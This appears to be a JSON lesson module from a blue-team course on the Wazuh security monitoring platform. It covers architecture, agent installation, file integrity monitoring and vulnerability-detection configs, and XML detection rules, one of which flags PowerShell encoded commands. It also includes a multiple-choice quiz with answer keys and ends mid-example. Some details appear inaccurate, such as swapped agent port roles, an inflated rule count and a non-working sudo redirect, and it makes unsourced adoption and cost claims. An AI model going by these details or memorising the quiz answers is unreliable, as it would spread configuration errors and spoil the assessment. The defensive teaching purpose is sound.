{
  "lesson_id": "d4e9f6a2-0b3c-4d8e-9f7a-3c7b0e2d6f0a",
  "domain": "blue_team",
  "title": "Wazuh: Open-Source XDR and Security Monitoring Platform",
  "difficulty": 2,
  "order_index": 10,
  "prerequisites": [
    "b7f2e1d4-9a3c-4e8b-7d2f-5c1a9e6b3d8f"
  ],
  "concepts": [
    "Wazuh architecture (manager, agents, indexer)",
    "Security Information and Event Management (SIEM)",
    "Extended Detection and Response (XDR)",
    "File Integrity Monitoring (FIM)",
    "Vulnerability detection",
    "Configuration assessment (CIS benchmarks)",
    "Compliance monitoring (PCI-DSS, GDPR, HIPAA)",
    "Threat intelligence integration (MISP, AlienVault OTX)",
    "Active response and automation",
    "Wazuh API and integration"
  ],
  "estimated_time": 45,
  "learning_objectives": [
    "Understand Wazuh's XDR architecture and capabilities",
    "Deploy Wazuh manager and agents across Windows/Linux environments",
    "Configure file integrity monitoring (FIM) for critical files",
    "Implement vulnerability detection and patch management workflows",
    "Use Wazuh for compliance monitoring (CIS benchmarks, PCI-DSS)",
    "Create custom rules for threat detection",
    "Integrate threat intelligence feeds",
    "Configure active response for automated remediation",
    "Build security dashboards in Wazuh UI (OpenSearch)"
  ],
  "post_assessment": [
    {
      "question": "What is Wazuh's primary architecture model?",
      "options": [
        "Single server only",
        "Manager-agent architecture with centralized indexer",
        "Peer-to-peer network",
        "Cloud-only SaaS"
      ],
      "correct_answer": 1,
      "explanation": "Wazuh uses a manager-agent architecture where agents collect data from endpoints, send to the Wazuh manager for analysis, and results are stored in Wazuh Indexer (OpenSearch/Elasticsearch).",
      "difficulty": 1,
      "topic": "wazuh_architecture",
      "subtopic": "components",
      "question_id": "ee49c6bf-e0b0-4871-876b-6e6d85e9357d",
      "type": "multiple_choice"
    },
    {
      "question": "What is File Integrity Monitoring (FIM) in Wazuh?",
      "options": [
        "Antivirus scanning",
        "Monitoring files for unauthorized changes (creation, modification, deletion)",
        "File compression",
        "Backup automation"
      ],
      "correct_answer": 1,
      "explanation": "FIM monitors specified files and directories for changes. It detects unauthorized modifications, which is critical for detecting tampering, malware, and compliance violations (e.g., PCI-DSS requirement 11.5).",
      "difficulty": 1,
      "topic": "fim",
      "subtopic": "monitoring",
      "question_id": "29ea9908-c5d4-4a67-bbcc-31da1354a6b9",
      "type": "multiple_choice"
    },
    {
      "question": "Which Wazuh component performs vulnerability detection?",
      "options": [
        "Wazuh agent scans locally",
        "Wazuh manager correlates installed software with CVE databases",
        "External scanner required",
        "No vulnerability detection available"
      ],
      "correct_answer": 1,
      "explanation": "The Wazuh manager collects installed software inventory from agents and correlates it against vulnerability databases (NVD, vendor feeds) to identify CVEs affecting the environment.",
      "difficulty": 2,
      "topic": "vulnerability_detection",
      "subtopic": "scanning",
      "question_id": "ef059a37-525d-43b7-884f-cdf50019d806",
      "type": "multiple_choice"
    },
    {
      "question": "What is an 'active response' in Wazuh?",
      "options": [
        "Manual incident response",
        "Automated action triggered by security events (block IP, disable user, restart service)",
        "Active monitoring",
        "Response team paging"
      ],
      "correct_answer": 1,
      "explanation": "Active response is Wazuh's automated remediation feature. When a rule triggers (e.g., brute-force detected), Wazuh can execute scripts to block IPs, disable accounts, or restart services automatically.",
      "difficulty": 2,
      "topic": "active_response",
      "subtopic": "automation",
      "question_id": "a8cc8580-f7d5-4309-966b-725f1962dcd5",
      "type": "multiple_choice"
    },
    {
      "question": "Which compliance frameworks does Wazuh support out-of-the-box?",
      "options": [
        "None",
        "PCI-DSS, GDPR, HIPAA, NIST 800-53, CIS benchmarks",
        "Only PCI-DSS",
        "Only HIPAA"
      ],
      "correct_answer": 1,
      "explanation": "Wazuh includes pre-built rules and dashboards for multiple compliance frameworks: PCI-DSS, GDPR, HIPAA, NIST 800-53, TSC SOC2, and CIS benchmarks.",
      "difficulty": 1,
      "topic": "compliance",
      "subtopic": "frameworks",
      "question_id": "8145032d-95bf-4a12-9d2c-e7ada523a8f8",
      "type": "multiple_choice"
    },
    {
      "question": "How does Wazuh detect rootkits?",
      "options": [
        "Antivirus signatures",
        "Rootcheck module scans for hidden processes, files, and kernel-level anomalies",
        "Network traffic analysis",
        "User behavior analytics"
      ],
      "correct_answer": 1,
      "explanation": "Wazuh's Rootcheck module performs system-level checks to detect rootkits by looking for hidden processes, anomalies in system binaries, and kernel-level manipulations.",
      "difficulty": 2,
      "topic": "rootkit_detection",
      "subtopic": "rootcheck",
      "question_id": "4560f1af-d630-412f-b275-c7a59bf15caf",
      "type": "multiple_choice"
    },
    {
      "question": "What is the Wazuh Indexer based on?",
      "options": [
        "MongoDB",
        "OpenSearch (Elasticsearch fork)",
        "PostgreSQL",
        "Redis"
      ],
      "correct_answer": 1,
      "explanation": "Wazuh Indexer is based on OpenSearch (open-source fork of Elasticsearch), providing full-text search, aggregation, and visualization capabilities for security data.",
      "difficulty": 2,
      "topic": "architecture",
      "subtopic": "indexer",
      "question_id": "323a6c28-af8c-4fc4-810d-f4a5ae529b31",
      "type": "multiple_choice"
    },
    {
      "question": "How would you detect brute-force SSH attacks using Wazuh?",
      "options": [
        "Manual log review",
        "Wazuh rules monitor authentication logs for repeated failures (rule ID 5712)",
        "Network packet inspection",
        "Firewall logs only"
      ],
      "correct_answer": 1,
      "explanation": "Wazuh includes pre-built rules (e.g., rule 5712) that detect SSH brute-force by monitoring authentication logs for repeated failed login attempts from the same source IP.",
      "difficulty": 2,
      "topic": "detection_rules",
      "subtopic": "brute_force",
      "question_id": "0278fb1a-fde9-4003-86b8-f42208046865",
      "type": "multiple_choice"
    },
    {
      "question": "What is Wazuh's CIS-CAT integration used for?",
      "options": [
        "Network scanning",
        "Automated CIS benchmark compliance assessment",
        "Malware analysis",
        "Log forwarding"
      ],
      "correct_answer": 1,
      "explanation": "Wazuh integrates with CIS-CAT (Center for Internet Security Configuration Assessment Tool) to automatically assess systems against CIS benchmarks and report compliance gaps.",
      "difficulty": 3,
      "topic": "compliance",
      "subtopic": "cis_cat",
      "question_id": "bdf533b5-9d05-44e3-aa27-6c752143f966",
      "type": "multiple_choice"
    },
    {
      "question": "What is the main advantage of Wazuh over commercial SIEM solutions?",
      "options": [
        "Faster performance",
        "Open-source, free, no licensing costs, with commercial-grade features",
        "Easier setup",
        "Better UI"
      ],
      "correct_answer": 1,
      "explanation": "Wazuh is completely open-source and free, providing enterprise-grade SIEM, XDR, FIM, vulnerability detection, and compliance monitoring without licensing costs (unlike Splunk's $150K+/TB/year).",
      "difficulty": 1,
      "topic": "wazuh_value",
      "subtopic": "cost",
      "question_id": "3f97b50e-ab32-4cc5-9720-78e7840d8494",
      "type": "multiple_choice"
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "minimum_effective_dose",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to Wazuh: The Open-Source Security Platform Revolution\n\nImagine having enterprise-grade security monitoring - SIEM, XDR, vulnerability scanning, compliance auditing, file integrity monitoring - all in ONE platform. And it's **completely free and open-source**.\n\n**Wazuh is the answer to expensive commercial SIEM solutions**, providing capabilities that rival Splunk, QRadar, and CrowdStrike Falcon, without the six-figure licensing costs.\n\n## Why Wazuh Is Disrupting the Security Market\n\n**Adoption Growth:**\n- 10+ million downloads\n- Used by NASA, ING Bank, Telefónica, Sony\n- 100,000+ deployments worldwide\n- Growing 50% year-over-year\n\n**Real-World Impact:**\n- **ING Bank**: Monitors 40,000+ endpoints for PCI-DSS compliance\n- **Telefónica**: Threat detection across global infrastructure\n- **NASA**: Security monitoring for sensitive research systems\n- **SMBs to Enterprises**: Free alternative to $500K/year Splunk deployments\n\n## What Makes Wazuh Special?\n\n**Unified Security Platform** (SIEM + XDR + More):\n\n1. **SIEM**: Log collection, correlation, alerting\n2. **XDR**: Endpoint detection and response\n3. **Vulnerability Detection**: Automated CVE scanning\n4. **File Integrity Monitoring (FIM)**: Detect unauthorized file changes\n5. **Configuration Assessment**: CIS benchmarks, hardening checks\n6. **Compliance**: PCI-DSS, GDPR, HIPAA, NIST 800-53\n7. **Threat Intelligence**: Integration with MISP, AlienVault OTX\n8. **Active Response**: Automated remediation (block IPs, disable users)\n9. **Rootkit Detection**: Find hidden malware\n10. **Container Security**: Docker and Kubernetes monitoring\n\n## Wazuh vs. Commercial Solutions\n\n| Feature | Wazuh | Splunk ES | CrowdStrike | QRadar |\n|---------|-------|-----------|-------------|--------|\n| Cost | Free (OSS) | $150K-$500K/TB/year | $8-$15/endpoint/year | $30K-$100K/year |\n| SIEM | ✅ | ✅ | ❌ | ✅ |\n| XDR/EDR | ✅ | ❌ (separate product) | ✅ | ❌ |\n| Vulnerability Scanning | ✅ | ❌ (separate tool) | ✅ | ❌ |\n| FIM | ✅ | ⚠️ (add-on) | ✅ | ⚠️ (limited) |\n| Compliance (PCI, HIPAA) | ✅ | ✅ | ⚠️ (partial) | ✅ |\n| Threat Intel | ✅ | ✅ | ✅ | ✅ |\n| Active Response | ✅ | ⚠️ (via SOAR) | ✅ | ⚠️ (limited) |\n| Open Source | ✅ | ❌ | ❌ | ❌ |\n| Community Support | ✅ Large | ⚠️ Commercial | ⚠️ Commercial | ⚠️ Commercial |\n\n**The Value Proposition**: Wazuh delivers 80% of commercial SIEM capabilities at 0% of the cost.\n\n## Why Learn Wazuh?\n\n**Career Value:**\n- **High demand**: Growing market share, especially in cost-conscious organizations\n- **Transferable skills**: Wazuh knowledge applies to Splunk, ELK, QRadar (similar concepts)\n- **Open-source advantage**: Modify, extend, customize (learn the internals)\n- **SMB market**: Small/medium businesses can't afford Splunk, but need security (huge opportunity)\n\n**Market Trends:**\n- Organizations moving from commercial SIEM to open-source (cost reduction)\n- \"Security democratization\" - powerful tools available to everyone\n- Wazuh experience = Elasticsearch + security knowledge = double value\n\n**Job Market:**\n- 5,000+ jobs mentioning Wazuh or open-source SIEM\n- Wazuh skills + commercial SIEM knowledge = highly versatile candidate\n- Consulting opportunities (implement Wazuh for SMBs at $100-$150/hour)\n\n**Bottom Line**: Wazuh is the future of affordable enterprise security. Master it, and you'll understand both open-source and commercial SIEM worlds."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "**🧠 Learning Mindset: Open-Source Doesn't Mean Inferior**\n\nLet's address the elephant in the room: **\"If Wazuh is free, is it as good as Splunk?\"**\n\nHere's the truth: **Wazuh is DIFFERENT, not inferior.**\n\n**What Wazuh Does Better:**\n- ✅ Cost (obviously - $0 vs. $500K)\n- ✅ Unified platform (SIEM + XDR + FIM + vulnerabilities in one tool)\n- ✅ Transparency (open-source = see exactly how it works)\n- ✅ Customization (modify source code, create custom modules)\n\n**What Commercial Tools Do Better:**\n- ⚠️ Ease of use (Splunk's UI is more polished)\n- ⚠️ Enterprise support (24/7 phone support vs. community forums)\n- ⚠️ Marketing (Splunk has bigger brand recognition)\n\n**Jim Kwik's Visualization Principle**: Picture yourself as a security engineer. Would you rather:\n\n**Option A**: Deploy Splunk at $500K/year, explain costs to management, fight for budget\n\n**Option B**: Deploy Wazuh at $0/year, spend saved budget on more analysts, customize freely\n\nFor many organizations, Option B is a no-brainer.\n\n**Your Learning Path** (Chunking Principle):\n\n**Week 1**: Wazuh architecture and deployment\n**Week 2**: Agent management and log collection\n**Week 3**: Detection rules and alerting\n**Week 4**: FIM, vulnerability detection, compliance\n**Week 5**: Integration (MISP, SOAR, threat intel)\n\n**Your First Goal**: Deploy Wazuh, connect 1 agent, see your first alert. That's proof you're learning.\n\nRemember: NASA uses Wazuh. If it's good enough for space missions, it's good enough for your lab. Let's go!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Wazuh Architecture: Understanding the XDR Platform\n\n## Core Components\n\n```\n┌──────────────────────────────────────────────────────────────┐\n│                   WAZUH XDR ARCHITECTURE                      │\n└──────────────────────────────────────────────────────────────┘\n\n  ENDPOINTS (Agents Collect Data)\n  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐\n  │Windows  │  │ Linux   │  │ macOS   │  │Container│\n  │  Agent  │  │  Agent  │  │  Agent  │  │  Agent  │\n  └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘\n       │            │            │            │\n       │  Collect: Logs, FIM, Syscalls, Vulns, Config\n       │  Protocol: TLS 1.3 (Port 1514/1515)\n       │\n       └────────────┴────────────┴────────────┘\n                    │\n                    ▼\n       ┌────────────────────────────┐\n       │     WAZUH MANAGER          │\n       │  ┌──────────────────────┐  │\n       │  │ Analysis Engine      │  │  - Receives agent data\n       │  │  - Decoders          │  │  - Analyzes with rules\n       │  │  - Rules (80,000+)   │  │  - Generates alerts\n       │  │  - CDB lists         │  │\n       │  └──────────┬───────────┘  │\n       │             │              │\n       │  ┌──────────▼───────────┐  │\n       │  │ Modules              │  │\n       │  │  - FIM               │  │  File Integrity\n       │  │  - Vulnerability Det │  │  CVE scanning\n       │  │  - SCA               │  │  Security Config Assessment\n       │  │  - Rootcheck         │  │  Rootkit detection\n       │  │  - VirusTotal        │  │  Hash lookup\n       │  └──────────┬───────────┘  │\n       │             │              │\n       │  ┌──────────▼───────────┐  │\n       │  │ Active Response      │  │  Automated actions\n       │  │  - Firewall (block) │  │\n       │  │  - Scripts           │  │\n       │  └──────────────────────┘  │\n       └────────────┬───────────────┘\n                    │  RESTful API (Port 55000)\n                    │  Alerts in JSON format\n                    ▼\n       ┌────────────────────────────┐\n       │    WAZUH INDEXER           │  (OpenSearch)\n       │  ┌──────────────────────┐  │\n       │  │ Index alerts         │  │  - Stores alerts\n       │  │ Full-text search     │  │  - Enables search\n       │  │ Aggregations         │  │  - Dashboards\n       │  └──────────────────────┘  │\n       └────────────┬───────────────┘\n                    │  REST API (Port 9200)\n                    ▼\n       ┌────────────────────────────┐\n       │    WAZUH DASHBOARD         │  (OpenSearch Dashboards)\n       │  ┌──────────────────────┐  │\n       │  │ Web UI               │  │  - Security events\n       │  │ Dashboards           │  │  - Compliance reports\n       │  │ Compliance views     │  │  - Agent management\n       │  │ Agent management     │  │  - Rule configuration\n       │  └──────────────────────┘  │\n       └────────────┬───────────────┘\n                    │  HTTPS (Port 443)\n                    ▼\n              SOC ANALYSTS\n              (Web Browser)\n\n  INTEGRATIONS:\n  ┌────────────────────────────────┐\n  │ Threat Intelligence            │  MISP, AlienVault OTX, VirusTotal\n  └────────────────────────────────┘\n  ┌────────────────────────────────┐\n  │ SOAR / Ticketing               │  TheHive, JIRA, ServiceNow\n  └────────────────────────────────┘\n  ┌────────────────────────────────┐\n  │ Cloud Security                 │  AWS, Azure, GCP audit logs\n  └────────────────────────────────┘\n```\n\n## Component Breakdown\n\n### 1. Wazuh Agent: Endpoint Data Collector\n\n**Lightweight Agent** (~10-50MB RAM):\n- Collects logs (Windows Event Logs, Syslog, application logs)\n- Monitors file integrity (FIM)\n- Detects rootkits and anomalies\n- Scans for vulnerabilities\n- Assesses security configuration\n- Monitors Docker containers\n\n**Supported Platforms:**\n- Windows (XP → Windows 11/Server 2022)\n- Linux (RHEL, CentOS, Debian, Ubuntu, SUSE, Amazon Linux)\n- macOS (10.x → latest)\n- Solaris, AIX, HP-UX\n- Docker containers\n\n**Agent Communication:**\n- Protocol: TLS 1.3 encrypted (AES-256)\n- Ports: 1514 (agent registration), 1515 (event submission)\n- Authentication: Pre-shared keys or auto-enrollment\n- Compression: Reduces bandwidth by 60-80%\n\n**Agent Modules:**\n\n1. **Log Collector**: Monitors files, Windows Event Logs, command outputs\n2. **File Integrity Monitoring (FIM)**: Real-time file/directory monitoring\n3. **Syscall Monitoring (Auditd)**: Linux kernel-level auditing\n4. **Rootcheck**: Rootkit and malware detection\n5. **OpenSCAP**: Security configuration assessment\n6. **Vulnerability Detector**: Inventory + CVE correlation\n7. **Command Monitoring**: Execute commands, collect output (e.g., `netstat`, `ps`)\n\n### 2. Wazuh Manager: Analysis and Correlation Engine\n\n**Role**: Central brain that analyzes agent data and generates alerts\n\n**Analysis Pipeline:**\n\n1. **Decoding**: Parse raw logs into structured fields\n   ```xml\n   <decoder name=\"sshd\">\n     <program_name>^sshd</program_name>\n     <regex>Failed password for (\\S+) from (\\S+) port (\\d+)</regex>\n     <order>user, srcip, srcport</order>\n   </decoder>\n   ```\n\n2. **Rule Matching**: Compare decoded data against rules\n   ```xml\n   <rule id=\"5712\" level=\"10\">\n     <if_matched_sid>5710</if_matched_sid>\n     <same_source_ip />\n     <description>Multiple authentication failures (brute force)</description>\n     <group>authentication_failures,</group>\n   </rule>\n   ```\n\n3. **Alert Generation**: Create structured alerts\n   ```json\n   {\n     \"rule_id\": 5712,\n     \"level\": 10,\n     \"description\": \"Multiple authentication failures (brute force)\",\n     \"agent\": {\"id\": \"001\", \"name\": \"web-server-01\"},\n     \"data\": {\n       \"srcip\": \"192.168.1.100\",\n       \"user\": \"root\"\n     }\n   }\n   ```\n\n**Wazuh Manager Capabilities:**\n\n- **Ruleset**: 80,000+ pre-built rules (OSSEC + Wazuh additions)\n- **CDB Lists**: IP reputation, user whitelists, geo-blocking\n- **Correlation**: Multi-event correlation (e.g., failed login → successful login → privilege escalation)\n- **GeoIP**: IP geolocation enrichment\n- **Active Response**: Execute scripts based on alerts\n\n**Manager Clustering** (High Availability):\n- Master-worker architecture\n- Automatic failover\n- Load balancing across workers\n- Shared configuration\n\n### 3. Wazuh Indexer: Data Storage (OpenSearch)\n\n**Based on**: OpenSearch 2.x (Elasticsearch 7.10.2 fork)\n\n**Purpose**: \n- Store alerts and security events\n- Enable full-text search\n- Power dashboards and visualizations\n\n**Index Management:**\n- Daily indices (e.g., `wazuh-alerts-4.x-2024.10.28`)\n- Index lifecycle policies (hot → warm → cold → delete)\n- Retention typically 90 days (configurable)\n\n**Cluster Configuration:**\n- 1 node: Small deployments (< 50 agents)\n- 3 nodes: Medium deployments (50-500 agents)\n- 5+ nodes: Large deployments (500+ agents)\n\n### 4. Wazuh Dashboard: Web UI (OpenSearch Dashboards)\n\n**Based on**: OpenSearch Dashboards (Kibana 7.10.2 fork)\n\n**Features:**\n\n- **Security Events**: Real-time alert monitoring\n- **Modules**: Dedicated views for FIM, vulnerabilities, compliance, threat hunting\n- **Compliance Dashboards**: PCI-DSS, GDPR, HIPAA, NIST 800-53, TSC SOC2\n- **Agent Management**: Deploy, configure, monitor agents\n- **Rule Testing**: Test decoders and rules with sample logs\n- **Reporting**: Generate PDF compliance reports\n\n**Main Modules:**\n\n1. **Security Events**: Alert timeline, filtering, drill-down\n2. **Integrity Monitoring**: FIM events (file changes)\n3. **Vulnerability Detection**: CVEs by severity, affected systems\n4. **Security Configuration Assessment (SCA)**: CIS benchmark compliance\n5. **Regulatory Compliance**: PCI-DSS, GDPR, HIPAA dashboards\n6. **MITRE ATT&CK**: Map alerts to MITRE tactics/techniques\n7. **Threat Hunting**: Query DSL for advanced searches\n\n## Data Flow Example: Detecting Brute-Force Attack\n\n1. **Event Occurs**: User attempts SSH login, fails (incorrect password)\n2. **Linux**: Writes to `/var/log/auth.log`: `Failed password for root from 192.168.1.100`\n3. **Wazuh Agent**: Monitors `/var/log/auth.log`, detects new line, sends to manager\n4. **Wazuh Manager**: \n   - Decodes log with `sshd` decoder (extracts user, srcip, srcport)\n   - Matches rule 5710 (\"Failed authentication\")\n   - Increments counter for srcip `192.168.1.100`\n   - After 5 failures in 2 minutes, triggers rule 5712 (\"Brute force attack\")\n   - Generates alert with level 10 (high severity)\n   - Executes active response: `firewall-drop` (blocks srcip)\n5. **Wazuh Indexer**: Stores alert in `wazuh-alerts-4.x-2024.10.28` index\n6. **Wazuh Dashboard**: Displays alert in Security Events, shows on \"Authentication\" dashboard\n7. **SOC Analyst**: Reviews alert, confirms malicious, marks as \"Confirmed Threat\"\n\n**Total Latency**: < 10 seconds from event to alert visibility"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Deploy Wazuh All-in-One (Manager + Indexer + Dashboard)\n\n## Lab Setup: Single-Server Wazuh Deployment\n\n### Prerequisites\n\n- Ubuntu 22.04 LTS (or RHEL 8/9, Debian 11)\n- 4 CPU cores, 8GB RAM, 50GB disk (minimum)\n- Root/sudo access\n- Internet connectivity\n\n### Step 1: Install Wazuh All-in-One\n\n**Using Wazuh Installation Assistant (Recommended)**\n\n```bash\n# Download installation assistant\ncurl -sO https://packages.wazuh.com/4.7/wazuh-install.sh\n\n# Run all-in-one installation\nsudo bash wazuh-install.sh -a\n\n# Installation includes:\n# - Wazuh Indexer (OpenSearch)\n# - Wazuh Manager\n# - Filebeat (ships logs to indexer)\n# - Wazuh Dashboard (Web UI)\n```\n\n**Installation will output credentials:**\n\n```\nINFO: --- Summary ---\nINFO: Wazuh web interface admin credentials:\n  Username: admin\n  Password: <random-password>\nINFO: Wazuh dashboard URL: https://<your-server-ip>\nINFO: Wazuh API credentials:\n  Username: wazuh-wui\n  Password: <api-password>\n```\n\n**Save these credentials!**\n\n### Step 2: Access Wazuh Dashboard\n\n1. Open browser: `https://<your-server-ip>`\n2. Accept self-signed certificate warning\n3. Login:\n   - Username: `admin`\n   - Password: (from installation output)\n\n**First-Time Setup:**\n\n- Wazuh will show quick start wizard\n- Click **\"Add agent\"** to begin deploying agents\n\n### Step 3: Deploy Wazuh Agent (Windows)\n\n**On Windows endpoint:**\n\n```powershell\n# Download agent installer\nInvoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi -OutFile wazuh-agent.msi\n\n# Install with configuration\nmsiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER=\"<wazuh-manager-ip>\" WAZUH_AGENT_NAME=\"WIN-PC-01\"\n\n# Start service\nNET START WazuhSvc\n```\n\n**Verify Connection:**\n\nIn Wazuh Dashboard:\n1. Navigate to **Agents** → **All Agents**\n2. Verify agent appears with status \"Active\"\n\n### Step 4: Deploy Wazuh Agent (Linux)\n\n**On Ubuntu/Debian:**\n\n```bash\n# Import GPG key\ncurl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg\n\n# Add repository\necho \"deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main\" | tee -a /etc/apt/sources.list.d/wazuh.list\n\n# Install agent\napt-get update\napt-get install wazuh-agent\n\n# Configure manager IP\nsudo sed -i \"s|<address>.*</address>|<address><wazuh-manager-ip></address>|\n\" /var/ossec/etc/ossec.conf\n\n# Enable and start agent\nsystemctl daemon-reload\nsystemctl enable wazuh-agent\nsystemctl start wazuh-agent\n```\n\n**On RHEL/CentOS:**\n\n```bash\n# Import GPG key\nrpm --import https://packages.wazuh.com/key/GPG-KEY-WAZUH\n\n# Add repository\ncat > /etc/yum.repos.d/wazuh.repo << EOF\n[wazuh]\ngpgcheck=1\ngpgkey=https://packages.wazuh.com/key/GPG-KEY-WAZUH\nenabled=1\nname=EL-\\$releasever - Wazuh\nbaseurl=https://packages.wazuh.com/4.x/yum/\nprotect=1\nEOF\n\n# Install agent\nyum install wazuh-agent\n\n# Configure and start (same as Ubuntu)\n```\n\n### Step 5: Configure File Integrity Monitoring (FIM)\n\n**On Linux Agent** (`/var/ossec/etc/ossec.conf`):\n\n```xml\n<syscheck>\n  <!-- Frequency of scan (every 12 hours) -->\n  <frequency>43200</frequency>\n\n  <!-- Monitor critical directories -->\n  <directories check_all=\"yes\" realtime=\"yes\">/etc</directories>\n  <directories check_all=\"yes\" realtime=\"yes\">/usr/bin,/usr/sbin</directories>\n  <directories check_all=\"yes\" realtime=\"yes\">/root</directories>\n  \n  <!-- Monitor web directories -->\n  <directories check_all=\"yes\" realtime=\"yes\">/var/www</directories>\n  \n  <!-- Ignore temporary files -->\n  <ignore>/etc/mtab</ignore>\n  <ignore>/etc/hosts.deny</ignore>\n  <ignore>/etc/resolv.conf</ignore>\n  \n  <!-- Report changes for specific file types -->\n  <no_diff>/etc/ssl/private.key</no_diff>\n</syscheck>\n```\n\n**On Windows Agent** (`C:\\Program Files (x86)\\ossec-agent\\ossec.conf`):\n\n```xml\n<syscheck>\n  <frequency>43200</frequency>\n  \n  <!-- Monitor system directories -->\n  <directories check_all=\"yes\" realtime=\"yes\">C:\\Windows\\System32</directories>\n  <directories check_all=\"yes\" realtime=\"yes\">C:\\Program Files</directories>\n  \n  <!-- Monitor startup locations -->\n  <windows_registry>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</windows_registry>\n  <windows_registry>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</windows_registry>\n  \n  <!-- Ignore Windows temp files -->\n  <ignore>C:\\Windows\\Temp</ignore>\n</syscheck>\n```\n\n**Restart Agent After Configuration:**\n\n```bash\n# Linux\nsudo systemctl restart wazuh-agent\n\n# Windows (PowerShell)\nRestart-Service WazuhSvc\n```\n\n### Step 6: Enable Vulnerability Detection\n\n**On Wazuh Manager** (`/var/ossec/etc/ossec.conf`):\n\n```xml\n<vulnerability-detector>\n  <enabled>yes</enabled>\n  <interval>5m</interval>\n  <min_full_scan_interval>6h</min_full_scan_interval>\n  <run_on_start>yes</run_on_start>\n\n  <!-- Ubuntu/Debian vulnerability feed -->\n  <provider name=\"canonical\">\n    <enabled>yes</enabled>\n    <os>trusty</os>\n    <os>xenial</os>\n    <os>bionic</os>\n    <os>focal</os>\n    <os>jammy</os>\n    <update_interval>1h</update_interval>\n  </provider>\n\n  <!-- RHEL/CentOS vulnerability feed -->\n  <provider name=\"redhat\">\n    <enabled>yes</enabled>\n    <update_interval>1h</update_interval>\n  </provider>\n\n  <!-- Windows vulnerability feed (NVD) -->\n  <provider name=\"msu\">\n    <enabled>yes</enabled>\n    <update_interval>1h</update_interval>\n  </provider>\n\n  <!-- National Vulnerability Database -->\n  <provider name=\"nvd\">\n    <enabled>yes</enabled>\n    <update_interval>1h</update_interval>\n  </provider>\n</vulnerability-detector>\n```\n\n**Restart Wazuh Manager:**\n\n```bash\nsudo systemctl restart wazuh-manager\n```\n\n### Step 7: Verify Setup\n\n**Check Agent Status:**\n\n```bash\n# On Wazuh Manager\nsudo /var/ossec/bin/agent_control -l\n\n# Output:\nWazuh agent_control. List of available agents:\n   ID: 001, Name: WIN-PC-01, IP: 192.168.1.50, Active\n   ID: 002, Name: ubuntu-server, IP: 192.168.1.51, Active\n```\n\n**In Wazuh Dashboard:**\n\n1. **Security Events**: See incoming alerts\n2. **Integrity Monitoring**: View FIM events (file changes)\n3. **Vulnerability Detection**: See detected CVEs\n4. **Agents**: Verify agent connectivity and health\n\n**Test FIM:**\n\n```bash\n# On Linux agent, modify monitored file\nsudo echo \"test\" >> /etc/hosts\n\n# Check Wazuh Dashboard → Integrity Monitoring\n# Alert should appear: \"File modified: /etc/hosts\"\n```\n\nCongratulations! You now have a working Wazuh deployment with agents, FIM, and vulnerability detection!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Wazuh Detection: Rules, Decoders, and Correlation\n\n## Understanding Wazuh Rules\n\nWazuh uses **XML-based rules** to detect security events. Rules match decoded log data and generate alerts.\n\n### Rule Anatomy\n\n```xml\n<rule id=\"5712\" level=\"10\" frequency=\"6\" timeframe=\"120\">\n  <if_matched_sid>5710</if_matched_sid>\n  <same_source_ip />\n  <description>Multiple SSH authentication failures (brute force)</description>\n  <mitre>\n    <id>T1110</id>  <!-- Brute Force -->\n  </mitre>\n  <group>authentication_failures,pci_dss_10.2.4,pci_dss_10.2.5,gpg13_7.1,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>\n</rule>\n```\n\n**Field Breakdown:**\n\n- `id`: Unique rule identifier (1-999999)\n- `level`: Severity (0-15)\n  - 0-2: Informational\n  - 3-5: Low\n  - 6-9: Medium\n  - 10-12: High\n  - 13-15: Critical\n- `frequency`: Number of times rule must trigger\n- `timeframe`: Time window (seconds) for frequency\n- `if_matched_sid`: Parent rule ID (correlation)\n- `same_source_ip`: Correlation condition (same IP)\n- `description`: Human-readable alert description\n- `mitre`: MITRE ATT&CK technique mapping\n- `group`: Tags for compliance, categorization\n\n### Common Rule Patterns\n\n**Pattern 1: Simple Match**\n\n```xml\n<!-- Detect successful SSH login -->\n<rule id=\"5715\" level=\"3\">\n  <decoded_as>sshd</decoded_as>\n  <match>Accepted</match>\n  <description>SSH successful login</description>\n  <group>authentication_success,</group>\n</rule>\n```\n\n**Pattern 2: Regex Match**\n\n```xml\n<!-- Detect PowerShell encoded command -->\n<rule id=\"91816\" level=\"12\">\n  <if_sid>91815</if_sid>  <!-- Windows process creation -->\n  <field name=\"win.eventdata.commandLine\" type=\"pcre2\">(?i)powershell.*-enc</field>\n  <description>PowerShell executed with encoded command (possible obfuscation)</description>\n  <mitre>\n    <id>T1059.001</id>  <!-- PowerShell -->\n    <id>T1027</id>      <!-- Obfuscated Files or Information -->\n  </mitre>\n</rule>\n```\n\n**Pattern 3: Field Comparison**\n\n```xml\n<!-- Detect user added to admin group -->\n<rule id=\"18145\" level=\"10\">\n  <if_sid>18140</if_sid>\n  <field name=\"win.system.eventID\">^4732$</field>\n  <field name=\"win.eventdata.targetUserName\" type=\"pcre2\">Administrators|Domain Admins</field>\n  <description>User added to privileged group</description>\n  <mitre>\n    <id>T1078</id>  <!-- Valid Accounts -->\n  </mitre>\n</rule>\n```\n\n**Pattern 4: Correlation (Multi-Event)**\n\n```xml\n<!-- Detect failed login followed by successful login (credential stuffing) 